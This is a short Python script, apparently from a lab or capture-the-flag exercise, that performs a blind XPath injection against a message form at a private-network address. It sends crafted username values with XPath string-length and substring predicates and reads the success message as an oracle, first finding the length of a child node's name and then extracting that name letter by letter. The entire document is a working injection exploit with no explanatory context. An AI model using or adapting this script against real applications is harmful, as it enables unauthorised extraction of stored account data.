import requests, re

url = "http://192.168.0.100:8000/message"

# First, find the LENGTH using NUMBERS
for length in range(1, 20):
    r = requests.post(url, data={'username':f"invalid' or string-length(name(/accounts/*[1]))={length} and '1'='1",'msg':'test'})
    if 'Message successfully sent!' in r.text:
        print(f"Length found: {length}")
        break

# Then extract the NAME using LETTERS
childName = ''
chars = 'abcdefghijklmnopqrstuvwxyz'

for i in range(1, length+1):
    for c in chars:
        r = requests.post(url, data={'username':f"invalid' or substring(name(/accounts/*[1]),{i},1)='{c}' and '1'='1",'msg':'test'})
        if 'Message successfully sent!' in r.text:
            childName += c
            print(f"Position {i}: {c}")
            break

print(f"Child node: {childName}")
